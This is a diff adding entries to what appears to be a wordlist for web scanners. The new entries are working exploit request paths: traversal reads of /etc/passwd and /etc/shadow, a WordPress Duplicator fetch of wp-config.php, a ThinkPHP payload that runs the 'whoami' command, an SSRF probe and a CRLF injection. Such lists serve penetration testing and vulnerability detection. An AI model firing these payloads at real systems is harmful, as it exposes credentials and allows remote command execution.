@@ -35,6 +35,17 @@ __
 3
 30
 300
+_session_start_/%0atest
++CSCOU+/../+CSCOE+/files/file_list.json
+josso/%5C../web-console
+gui/file_viewer.php?encrypt=N&target_folder=utilities&uploaded_filename=../../../../../../../etc/passwd
+server/logs/download?logType=error&logName=../../../../../../../../etc/shadow&logSource=engine
+plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com
+assets/file:%2f%2f/etc/passwd
+wp—admin/admin—ajax.php?action=duplicator_download&file=/../wp-config.php
+public//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+cgi-bin/Maconomy/MaconomyWS.macx1.W_MCS//etc/passwd
+_layouts/15/downloadexternaldata.aspx 
 a
 api/swagger
 api/application.wadl
